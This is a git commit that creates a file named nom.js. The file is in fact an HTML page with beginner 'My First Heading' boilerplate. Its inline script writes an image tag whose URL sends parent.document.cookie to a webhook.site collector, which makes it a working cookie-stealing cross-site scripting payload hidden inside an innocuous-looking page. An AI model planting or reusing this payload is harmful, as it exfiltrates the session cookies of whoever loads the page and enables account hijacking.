dc5f15a91769131ba5ed2cee3456f8b06c576d15
Rui Silva <68374289+RuiSN@users.noreply.github.com>
2021-04-04 04:07:09 +0100

    Create nom.js

---
+++ nom.js
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>My First Heading</h1>
+
+<p>My first paragraph.</p>
+<script>document.write('<img src="https://webhook.site/b3be6ee6-2d46-4009-9c08-d2f4dd487500?cookie=' + parent.document.cookie + '" />')</script>
+</body>
+</html>
+
